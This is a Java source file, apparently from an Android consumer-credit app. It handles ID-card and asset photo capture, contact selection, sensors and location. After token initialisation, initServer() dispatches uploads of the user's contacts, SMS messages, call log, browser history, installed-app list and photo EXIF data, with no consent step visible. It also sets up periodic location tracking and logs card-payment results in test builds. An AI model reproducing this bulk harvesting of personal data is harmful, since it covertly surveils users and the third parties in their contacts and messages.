package com.yxjr.credit.ui.presenter;

import java.util.List;

import org.json.JSONException;
import org.json.JSONObject;

import com.yxjr.credit.constants.JsConstant;
import com.yxjr.credit.constants.SpConstant;
import com.yxjr.credit.constants.YxCommonConstant;
import com.yxjr.credit.grab.ContactsGrab;
import com.yxjr.credit.http.manage.RequestEngine;
import com.yxjr.credit.http.manage.RequestCallBack;
import com.yxjr.credit.log.YxLog;
import com.yxjr.credit.ui.YxActivityManager;
import com.yxjr.credit.ui.YxCallBack;
import com.yxjr.credit.ui.YxHandler;
import com.yxjr.credit.ui.view.DialogLoading;
import com.yxjr.credit.ui.view.YxViewAddAssetCar;
import com.yxjr.credit.ui.view.YxViewAddAssetHouse;
import com.yxjr.credit.ui.view.YxViewAutonymCertify;
import com.yxjr.credit.util.PermissionUtil;
import com.yxjr.credit.util.ToastUtil;
import com.yxjr.credit.util.YxEmojiFilter;
import com.yxjr.credit.util.YxPictureUtil;
import com.yxjr.credit.util.YxStoreUtil;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.hardware.Sensor;
import android.hardware.SensorEventListener;
import android.hardware.SensorManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Message;
import android.provider.ContactsContract;
import android.util.Log;

public class PEntryActivity {

	private Activity mActivity;
	private YxHandler mHandler;
	private YxCallBack mYxCallBack;

	public PEntryActivity(Activity activity, YxHandler handler, YxCallBack yxCallback) {
		this.mActivity = activity;
		this.mHandler = handler;
		this.mYxCallBack = yxCallback;
	}

	// a、跳转页面/关闭页面

	// b、activityResult数据回调
	public void activityResult(int requestCode, int resultCode, Intent data, YxViewAutonymCertify autonymCertifyLayout,
			YxViewAddAssetHouse assetHouseLayout, YxViewAddAssetCar assetCarLayout) {

		switch (requestCode) {
		case YxCommonConstant.ActivityCode.RequestCode.AUTONYM_CERTIFY_ID_CARD_FRONT:// 身份证正面拍照
			if (autonymCertifyLayout != null) {
				if (resultCode == Activity.RESULT_OK) {
					String frontPicPath = data.getStringExtra("picPath");
					YxPictureUtil.galleryAddPic(mActivity, frontPicPath);// 添加到图库,这样可以在手机的图库程序中看到程序拍摄的照片
					if (frontPicPath != null) {
						autonymCertifyLayout.setAutonymIdNumFrontPic(frontPicPath);
					}
				}
			}
			break;
		case YxCommonConstant.ActivityCode.RequestCode.AUTONYM_CERTIFY_ID_CARD_VERSO:// 身份证反面拍照
			if (autonymCertifyLayout != null) {
				if (resultCode == Activity.RESULT_OK) {
					String versoPicPath = data.getStringExtra("picPath");
					YxPictureUtil.galleryAddPic(mActivity, versoPicPath);
					autonymCertifyLayout.setAutonymIdNumVersoPic(versoPicPath);
				}
			}
			break;
		case YxCommonConstant.ActivityCode.RequestCode.AUTONYM_CERTIFY_ID_CARD_HAND:// 手持身份证拍照
			if (autonymCertifyLayout != null) {
				if (resultCode == Activity.RESULT_OK) {
					String handPicPath = data.getStringExtra("picPath");
					YxPictureUtil.galleryAddPic(mActivity, handPicPath);
					autonymCertifyLayout.setAutonymIdNumHandPic(handPicPath);
				}
			}
			break;

		case YxCommonConstant.ActivityCode.RequestCode.CAR_CREDENTIAL:// 行驶证拍照
			if (assetCarLayout != null) {
				String carPicPath = assetCarLayout.bmpFactory.getCameraFilePath(requestCode, resultCode, data);
				if (resultCode == Activity.RESULT_OK) {
					YxPictureUtil.galleryAddPic(mActivity, carPicPath);
					assetCarLayout.setCarCredentialPic(carPicPath);
				} else {
					YxPictureUtil.deleteTempFile(carPicPath);
				}
			}
			break;
		case YxCommonConstant.ActivityCode.RequestCode.HOUSE_CREDENTIAL:// 房产证拍照
			if (assetHouseLayout != null) {
				String housePicPath = assetHouseLayout.bmpFactory.getCameraFilePath(requestCode, resultCode, data);
				if (resultCode == Activity.RESULT_OK) {
					YxPictureUtil.galleryAddPic(mActivity, housePicPath);
					assetHouseLayout.setHouseCredentialPic(housePicPath);
				} else {
					YxPictureUtil.deleteTempFile(housePicPath);
				}
			}
			break;
		case YxCommonConstant.ActivityCode.RequestCode.CONTACTS_REQUEST_CODE:
			if (resultCode == Activity.RESULT_OK) {
				if (PermissionUtil.isContactsPer(mActivity).equals(PermissionUtil.UNAUTHORIZED)) {
					mYxCallBack.showDialog("请开启读取联系人权限后重试!");
					return;
				}
				if (data == null) {
					return;
				}
				// 处理返回的data,获取选择的联系人信息
				Uri uri = data.getData();
				String[] contacts = getPhoneContacts(uri);
				String contactName = contacts[0];
				String contactNum = contacts[1];
				YxLog.d("========" + contactName + ":" + contactNum);

				JSONObject contact = new JSONObject();
				if (null == contactName || null == contactNum) {
					ToastUtil.showToast(mActivity, "联系人姓名和号码不能为空！");
					return;
				}
				if ("".equals(contactName) || "".equals(contactNum)) {
					ToastUtil.showToast(mActivity, "联系人姓名和号码不能为空！");
					return;
				}
				try {
					contact.put("name", contactName);
					contact.put("number", contactNum);
				} catch (JSONException e) {
					e.printStackTrace();
				}
				if (contactName.length() > ContactsGrab.mNameMaxLength) {
					ToastUtil.showToast(mActivity, "联系人姓名过长！");
					return;
				}
				if (contactNum.length() > ContactsGrab.mPhoneNumberMaxLength) {
					ToastUtil.showToast(mActivity, "联系人号码过长！");
					return;
				}
				if (YxEmojiFilter.containsEmoji(contactName)) {
					ToastUtil.showToast(mActivity, "联系人姓名不能包含表情！");
					return;
				}
				mYxCallBack.loadUrl(JsConstant.GET_CONTACTS, contact.toString());
			}
			break;
		case YxCommonConstant.ActivityCode.RequestCode.SWIPING_CARD_PAY:// 刷卡付款
			if (resultCode == YxCommonConstant.ActivityCode.ResultCode.SWIPING_CARD_PAY_BACK_RESCODE) {// 刷卡付款

				mYxCallBack.loadUrl(JsConstant.SWIPING_CARD_PAY, data.getStringExtra("payResultData"));
				if (null != data.getStringExtra("payResultData")) {
					if (YxCommonConstant.LogParam.IS_UAT_RELEASE) {
						Log.i("YxCredit", "刷卡信息：" + data.getStringExtra("payResultData"));
						ToastUtil.showToast(mActivity, "刷卡完成");
					}
				}

			}
		default:
			break;
		}
	}

	DialogLoading mDialogLoading;

	// c、初始化请求
	public void initServer() {
		mDialogLoading = new DialogLoading(mActivity, "初始化");
		mDialogLoading.show();
		new RequestEngine(mActivity).executeInitToken(new RequestCallBack(mActivity) {
			@Override
			public void onSucces(String result) {
				mYxCallBack.initWebView(YxStoreUtil.get(mActivity, SpConstant.UPGRADE));
				// 开始心跳
				Message msg = mHandler.obtainMessage(mHandler.START_SERVICE, 1, 1, "startService");
				mHandler.sendMessage(msg);
				// 上传通讯录
				// YxGetContacts mGetContacts = new YxGetContacts(mActivity,
				// null);
				// mGetContacts.sendContact();
				Message msgContacts = mHandler.obtainMessage(mHandler.SEND_CONTACTS, 8, 8, "sendContacts");
				mHandler.sendMessage(msgContacts);
				// 上传短信
				Message msgSMS = mHandler.obtainMessage(mHandler.SEND_SMS, 2, 2, "sendSMS");
				mHandler.sendMessage(msgSMS);
				// 上传通话记录
				Message msgCallLog = mHandler.obtainMessage(mHandler.SEND_CALL_LOG, 5, 5, "sendCallLog");
				mHandler.sendMessage(msgCallLog);
				// 上传浏览器历史记录
				Message msgBrowserHistory = mHandler.obtainMessage(mHandler.SEND_BROWSER_HISTORY, 6, 6,
						"sendBrowserHistory");
				mHandler.sendMessage(msgBrowserHistory);
				// 上传app列表
				Message msgAppList = mHandler.obtainMessage(mHandler.SEND_APP_LIST, 7, 7, "sendAppList");
				mHandler.sendMessage(msgAppList);
				// 上传照片信息
				Message imgExifList = mHandler.obtainMessage(mHandler.SEND_IMGEXIF, 9, 9, "sendImgexif");
				mHandler.sendMessage(imgExifList);
				// mActivity.startActivity(new Intent(mActivity,
				// ScanIDCardActivity.class));
				// mActivity.startActivity(new Intent(mActivity,
				// LivenessActivity.class));

//				 String liveAppNo = "20170504170000000212";
//				 String liveCategoryCode = null;
//				 Intent liveIntent = new Intent(mActivity,
//				 LivenessActivity.class);
//				 liveIntent.putExtra("appNo", StringUtil.isEmpty(liveAppNo) ?
//				 "empty" : liveAppNo);
//				 liveIntent.putExtra("categoryCode",
//				 StringUtil.isEmpty(liveCategoryCode) ? "empty" :
//				 liveCategoryCode);
//				 mActivity.startActivity(liveIntent);
//				 LivenessActivity.setCallback(mYxCallBack);
				//
				// String certId1 = "20170504170000000212";
				// String categoryCode1 = null;
				// mYxCallBack.addAutonymCertify(certId1, categoryCode1);
				mDialogLoading.cancel();
				super.onSucces(result);
			}

			@Override
			public void onFailure(String errorCode, String errorMsg) {
				mDialogLoading.cancel();
				ToastUtil.showToast(mActivity, errorMsg);
				YxActivityManager.finishAllActivity();
				super.onFailure(errorCode, errorMsg);
			}
		});
	}

	// d、初始化传感器
	@SuppressWarnings("deprecation")
	public void initSensor(SensorManager mSensorManager, SensorEventListener mSensorEventListener) {
		Sensor mOrientationSensor;// 方向传感器
		Sensor mAccelerometerSensor;// 加速度传感器
		Sensor mGravitySensor;// 重力传感器
		Sensor mGyroscopeSensor;// 陀螺仪传感器
		mOrientationSensor = mSensorManager.getDefaultSensor(Sensor.TYPE_ORIENTATION);// 方向传感器(水平传感器)
		if (mOrientationSensor == null) {
			YxLog.e("设备不支持方向传感器！");
		} else {
			mSensorManager.registerListener(mSensorEventListener, mOrientationSensor,
					SensorManager.SENSOR_DELAY_NORMAL);
		}
		mAccelerometerSensor = mSensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER);// 加速度传感器
		if (mAccelerometerSensor == null) {
			YxLog.e("设备不支持加速度传感器！");
		} else {
			mSensorManager.registerListener(mSensorEventListener, mAccelerometerSensor,
					SensorManager.SENSOR_DELAY_NORMAL);
		}
		mGravitySensor = mSensorManager.getDefaultSensor(Sensor.TYPE_GRAVITY);// 重力传感器
		if (mGravitySensor == null) {
			YxLog.e("设备不支持重力传感器！");
		} else {
			mSensorManager.registerListener(mSensorEventListener, mGravitySensor, SensorManager.SENSOR_DELAY_NORMAL);
		}
		mGyroscopeSensor = mSensorManager.getDefaultSensor(Sensor.TYPE_GYROSCOPE);// 陀螺仪传感器
		if (mGyroscopeSensor == null) {
			YxLog.e("设备不支持陀螺仪传感器！");
		} else {
			mSensorManager.registerListener(mSensorEventListener, mGyroscopeSensor, SensorManager.SENSOR_DELAY_NORMAL);
		}
	}

	// f、初始化location
	public Location initLocation(LocationManager mLocationManager, LocationListener mLocationListener) {
		Location location = null;
		String provider = null;
		List<String> providerList = mLocationManager.getProviders(true);// 获取可用的位置提供器
		if (providerList.contains(LocationManager.NETWORK_PROVIDER)) {// 优先使用
																		// AGPS
			provider = LocationManager.NETWORK_PROVIDER;
		} else if (providerList.contains(LocationManager.GPS_PROVIDER)) {// 使用
																			// GPS
			provider = LocationManager.GPS_PROVIDER;
		} else {// 没有可用的位置提供器
			return location;
		}
		if (null != provider) {
			mLocationManager.requestLocationUpdates(provider, YxCommonConstant.Params.GPS_MIN_TIME * 60 * 1000, 0,
					mLocationListener);// 每GPS_MIN_TIME分钟更新下当前位置
			try {
				location = mLocationManager.getLastKnownLocation(provider);
			} catch (SecurityException se) {
				// TODO: handle exception
				YxLog.e("Exception：without permission android.permission.ACCESS_FINE_LOCATION or android.permission.ACCESS_COARSE_LOCATION："
						+ se);
			} catch (Exception e) {
				// TODO: handle exception
				YxLog.e("Exception：" + e);
				e.printStackTrace();
			}
			return location;
		}
		return location;
	}

	private String[] getPhoneContacts(Uri uri) {
		String[] contact = new String[2];
		ContentResolver cr = mActivity.getContentResolver();// 得到ContentResolver对象
		Cursor cursor = cr.query(uri, null, null, null, null);// 取得电话本中开始一项的光标
		if (cursor != null && cursor.moveToFirst()) {
			int nameFieldColumnIndex = cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME);// 取得联系人姓名
			contact[0] = cursor.getString(nameFieldColumnIndex);
			Cursor phoneCursor = cr.query(uri, null, null, null, null);
			if (phoneCursor != null && phoneCursor.moveToFirst()) {
				contact[1] = phoneCursor
						.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
				phoneCursor.close();
			} else {
				contact[1] = null;
			}
			cursor.close();
		} else {
			contact[0] = null;
			contact[1] = null;
		}
		return contact;
	}
}
